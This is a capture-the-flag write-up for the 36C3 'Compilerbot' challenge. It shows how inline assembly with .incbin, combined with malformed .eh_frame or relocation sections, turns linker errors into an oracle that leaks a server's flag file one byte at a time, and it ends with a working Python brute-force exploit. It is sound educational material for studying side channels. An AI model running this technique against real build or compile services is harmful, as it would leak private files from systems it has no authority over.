---
title: 36C3 CTF - Compilerbot
authors: Ryan Govostes (rgov)
date: 2019-12-28
categories: misc
---


The server for this challenge accepts C source code and compiles it into an executable using Clang. Our objective is to recover the contents of the flag file, *but our code is never executed*. The server only tells us whether the compilation was successful and produced no warnings.

The server's response could serve as an oracle if we are able to guess part of the flag and make the compilation fail or emit a warning if our guess is incorrect.

We can throw out any approach that involves `#include "flag"` because the flag is likely not valid C code, and you [cannot abuse the preprocessor to create a string from the contents of a file](https://stackoverflow.com/questions/1246301/c-c-can-you-include-a-file-into-a-string-literal).

A better starting point is to use inline assembly and the the [`.incbin`](https://sourceware.org/binutils/docs/as/Incbin.html#Incbin) assembler directive, which includes the given file, or a portion of it, verbatim in the binary. (We first learned about this from write-ups of the [Oneline Calc](https://ctftime.org/task/9149) challenge from TokyoWesterns CTF 2019.)

When we use `.incbin`, the file contents are not embedded until the assembler stage, so we aren't going to be able to trigger an error dependent on the content of the flag before this stage (or during it).

The last stage, linking, follows the assembler. It transforms the object file produced by the assembler into an executable. This is the stage we should target: we want to produce an object file that the linker either accepts or rejects based on the contents of the flag.

To do this, we need to look at structures in the object file that the linker uses. There are a number of special sections (see [`elf(5)`](http://man7.org/linux/man-pages/man5/elf.5.html), under "Section header") which hold control information used by the linker; if one of these sections is invalid, it may cause a linker error.

For example, the GNU `ld` linker creates a lookup table from [`.eh_frame`](https://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-PDA/LSB-PDA/ehframechpt.html) sections, and if one of them is not correctly formed, the table generation will fail. We can create a valid section manually with inline assembly:

```c
// create a dummy a Call Frame Information record 
__asm__(
    ".pushsection .eh_frame\n"

    // length of CIE record
    ".long 0x0000000D\n"

    // CIE fields
    ".long 0x00000000\n"
    ".byte 0x01\n"
    ".asciz \"zR\"\n"
    ".byte 0\n"
    ".byte 0\n"
    ".byte 0\n"
    ".byte 0\n"
    ".byte 0\n"

    ".popsection\n"
);
```

Since the record contains a length field, we could corrupt the `.eh_frame` by providing a length that is too long or too short, causing the linker to read garbage when it scans the next record. For instance, we could read one byte of the flag file into the least-significant byte of the record length:

```c
    // length of CIE record
    ".incbin \"flag\", 0, 1\n"
    ".byte 0\n"
    ".byte 0\n"
    ".byte 0\n"
```

If the first byte of the flag has value 13 (carriage return), then the record length is correct and there will be no linker error. But for any other value, we get:

    /usr/bin/ld: error in /tmp/test-a17b24.o(.eh_frame); no .eh_frame_hdr table will be created

(Note that the compilation technically succeeds but the challenge server considers any message written to standard error as a failure.)

This can be used as our oracle. To test if the first byte is some value *other* than 13, we just need to pad the end of the struct:

```c
    // pad extra bytes; linking will succeed if the first byte of the flag
    // is 97 (ASCII 'a')
    ".rept 97 - 13\n"
    ".byte 0\n"
    ".endr\n"
```

Now we can adjust the amount of padding to change the record size until the linker stops complaining, which indicates that the record size is consistent with its length field, and therefore that the record size equals the value of the first byte of the flag.

This can be repeated for the next byte until the entire flag is recovered.


## Exploit

Thanks to Sophia d'Antoine for fixing an oversight in my exploit code.

```python
#!/usr/bin/env python
import subprocess


payload = r'''
__asm__ (
    ".pushsection .eh_frame\n"

    // length of CIE record, using one byte from flag
    // length must be at least 13
    ".incbin \"flag\", __OFFSET__, 1\n"
    ".rept 3\n"
    ".byte 0\n"
    ".endr\n"

    // 13 bytes of CIE record junk
    // http://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-Core-generic/LSB-Core-generic/ehframechpt.html
    ".long 0x00000000\n"
    ".byte 0x01\n"
    ".asciz \"zR\"\n"
    ".byte 0\n"
    ".byte 0\n"
    ".byte 0\n"
    ".byte 0\n"
    ".byte 0\n"

    ".rept __GUESS__ - 13\n"
    ".byte 0\n"
    ".endr\n"

    ".popsection\n"
);
'''


# this runs the compiler locally, running against the challenge server is left
# as an exercise to the reader
def try_compile(code):
    code = 'int main(void) { ' + code + ' }'
    sub = subprocess.Popen(['clang', '-x', 'c', '-o', '/dev/null', '-'],
                           stdin=subprocess.PIPE,
                           stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT)
    stdout, _ = sub.communicate(code)
    return sub.returncode == 0 and stdout.strip() == ''


# test first
code = payload
code = code.replace(r'".incbin \"flag\", __OFFSET__, 1\n"',
                    r'".byte 0x20\n"')
code = code.replace('__GUESS__', '0x20')
assert try_compile(code)


# recover the flag
flag = ''
for flag_offset in range(32):
    for guess in range(0x20, 0x7f):
        code = payload
        code = code.replace('__GUESS__', str(guess))
        code = code.replace('__OFFSET__', str(flag_offset))
        if try_compile(code):
            flag += chr(guess)
            break
    else:
        # no guess worked, maybe end of the flag
        break

print('flag is', flag)
```


## Bonus 

Due to an oversight, I initially implemented this exploit against GCC and found a slightly different oracle:

I created a dummy section of a certain number of bytes, and a [relocation entry](https://refspecs.linuxbase.org/elf/gabi4+/ch4.reloc.html) that would increment the byte at a given offset.

GCC, but not Clang, will apply the relocation by the time the final executable is linked. (If you can make this work with Clang, please let me know.)

If the relocation entry's offset is beyond the bounds of the dummy section, the linker complains:

    /usr/bin/ld: /tmp/ccQDGoK1.o(.foo+0x10): reloc against `*UND*': error 4
    /usr/bin/ld: final link failed: nonrepresentable section on output
    collect2: error: ld returned 1 exit status

We can apply the same general idea as above: use `.incbin` to read a byte of the flag into the relocation entry's offset, and adjust the size of the dummy section according to our guess.

```c
__asm__ (
    // create a section of N bytes
    ".pushsection .foo\n"
    ".rept 97\n"
    ".byte 0xFF\n"
    ".endr\n"
    ".popsection\n"
    
    // create a relocation that tries to modify our section at some offset
    // based on a single byte of the flag; if it is out of bounds then the
    // linker will error
    ".pushsection .rela.foo\n"
    ".align 1\n"

    // offset into .foo -- must not overflow !
    ".incbin \"flag\", 0, 1\n"
    ".rept 7\n"
    ".byte 0\n"
    ".endr\n"

    ".quad 0x000000000000000E\n" // type of reloc: R_X86_64_8
    ".quad 0x0000000000000001\n" // value to add at that offset
    ".popsection\n"
);
```
